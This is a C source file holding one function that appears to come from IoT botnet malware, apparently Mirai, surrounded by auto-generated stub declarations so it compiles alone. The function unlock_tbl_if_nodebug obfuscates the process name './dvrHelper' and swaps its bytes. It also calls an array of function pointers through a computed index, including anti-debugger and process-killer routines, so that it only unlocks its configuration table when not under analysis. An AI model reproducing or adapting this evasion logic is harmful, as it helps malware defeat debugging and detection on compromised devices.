#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
typedef  char uint8_t ;
typedef  int /*<<< orphan*/  obf_funcs ;
typedef  int /*<<< orphan*/  buf_src ;
typedef  int /*<<< orphan*/  buf_dst ;
typedef  int /*<<< orphan*/  BOOL ;

/* Variables and functions */
 int /*<<< orphan*/  FALSE ; 
 int /*<<< orphan*/  TRUE ; 
 int /*<<< orphan*/  anti_gdb_entry ; 
 int /*<<< orphan*/  ensure_single_instance ; 
 int /*<<< orphan*/  killer_init ; 
 void stub1 () ; 
 int /*<<< orphan*/  table_init () ; 
 int /*<<< orphan*/  table_lock_val ; 
 int /*<<< orphan*/  table_retrieve_val ; 
 int /*<<< orphan*/  table_unlock_val ; 
 int /*<<< orphan*/  util_memcpy ; 
 int /*<<< orphan*/  util_strcmp (char*,char*) ; 
 int util_strlen (char*) ; 
 int /*<<< orphan*/  util_zero (char*,int) ; 

__attribute__((used)) static BOOL unlock_tbl_if_nodebug(char *argv0)
{
    // ./dvrHelper = 0x2e 0x2f 0x64 0x76 0x72 0x48 0x65 0x6c 0x70 0x65 0x72
    char buf_src[18] = {0x2f, 0x2e, 0x00, 0x76, 0x64, 0x00, 0x48, 0x72, 0x00, 0x6c, 0x65, 0x00, 0x65, 0x70, 0x00, 0x00, 0x72, 0x00}, buf_dst[12];
    int i, ii = 0, c = 0;
    uint8_t fold = 0xAF;
    void (*obf_funcs[]) (void) = {
        (void (*) (void))ensure_single_instance,
        (void (*) (void))table_unlock_val,
        (void (*) (void))table_retrieve_val,
        (void (*) (void))table_init, // This is the function we actually want to run
        (void (*) (void))table_lock_val,
        (void (*) (void))util_memcpy,
        (void (*) (void))util_strcmp,
        (void (*) (void))killer_init,
        (void (*) (void))anti_gdb_entry
    };
    BOOL matches;

    for (i = 0; i < 7; i++)
        c += (long)obf_funcs[i];
    if (c == 0)
        return FALSE;

    // We swap every 2 bytes: e.g. 1, 2, 3, 4 -> 2, 1, 4, 3
    for (i = 0; i < sizeof (buf_src); i += 3)
    {
        char tmp = buf_src[i];

        buf_dst[ii++] = buf_src[i + 1];
        buf_dst[ii++] = tmp;

        // Meaningless tautology that gets you right back where you started
        i *= 2;
        i += 14;
        i /= 2;
        i -= 7;

        // Mess with 0xAF
        fold += ~argv0[ii % util_strlen(argv0)];
    }
    fold %= (sizeof (obf_funcs) / sizeof (void *));
    
#ifndef DEBUG
    (obf_funcs[fold])();
    matches = util_strcmp(argv0, buf_dst);
    util_zero(buf_src, sizeof (buf_src));
    util_zero(buf_dst, sizeof (buf_dst));
    return matches;
#else
    table_init();
    return TRUE;
#endif
}